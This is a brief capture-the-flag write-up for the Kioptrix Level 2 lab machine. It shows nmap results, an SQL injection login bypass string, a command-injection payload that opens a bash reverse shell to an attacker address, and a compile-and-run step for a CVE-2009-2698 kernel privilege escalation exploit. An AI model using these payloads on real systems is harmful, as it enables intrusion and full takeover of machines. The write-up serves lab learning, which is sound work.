<h1>Kioptrix: Level 2 Write-up</h1>

<h2>NMAP</h2>

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)
```

<h4>PORT 80</h4>

sql injection : 

```
' or ''='
```

Shell : 

```;bash -i >& /dev/tcp/192.168.43.253/8080 0>&1```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%202/Images/web%20exp%20to%20shell.png)
![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%202/Images/wwwshell.png)

<h2>Privilege Escalation :</h2> 

Basic enumeration will reveal that this CentOS version **(4.5 Final) **is vulnerable to CVE-2009-2698

Exploit : https://www.exploit-db.com/exploits/9542

Compile and run in Kioptrix Box with 

```gcc -o 0x82-CVE-2009-2698 0x82-CVE-2009-2698.c && ./0x82-CVE-2009-2698```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%202/Images/Priv%20Escalatation.png)
